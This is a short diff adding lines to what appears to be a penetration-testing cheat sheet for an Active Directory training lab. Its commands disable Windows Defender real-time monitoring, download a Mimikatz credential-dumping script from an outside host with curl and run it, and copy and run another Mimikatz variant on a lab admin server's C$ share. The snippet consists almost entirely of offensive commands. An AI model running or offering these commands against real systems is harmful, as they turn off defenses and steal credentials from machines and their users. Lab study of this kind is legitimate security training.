@@ -2653,6 +2653,13 @@ Get-MpPreference | findstr /I realtime
 $ExecutionContext.SessionState.LanguageMode
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+```
+```
+cd /windows
+curl http://172.16.99.209/oscp/crtp/Invoke-Mimikatz2.ps1 -outfile Invoke-Mimikatz2.ps1
+.\Invoke-Mimikatz2.ps1
+```
+```
 Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorpadminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
 .\InvokeMimikatzEx.ps1
 ```
